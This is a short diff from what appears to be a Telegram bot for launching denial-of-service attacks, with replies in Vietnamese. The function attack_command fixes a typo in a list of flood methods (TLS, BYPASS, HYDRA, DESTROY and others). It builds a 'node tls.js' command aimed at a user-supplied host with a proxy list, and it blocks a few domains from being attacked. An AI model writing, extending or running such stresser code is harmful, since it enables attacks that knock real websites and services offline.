@@ -217,7 +217,7 @@ def attack_command(message):
                 bot.reply_to(message, f"Không Được Phép Tấn Công Trang Web Có Tên Miền {blocked_domain}")
                 return
 
-    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESROY']:
+    if method in ['TLS', 'RAPID', 'BYPASS', 'RAW', 'HYDRA', 'HTTPS', 'MIX', 'DESTROY']:
         # Update the command and duration based on the selected method
         if method == 'TLS':
             command = ["node", "tls.js", host, "90", "64", "7", "live.txt"]
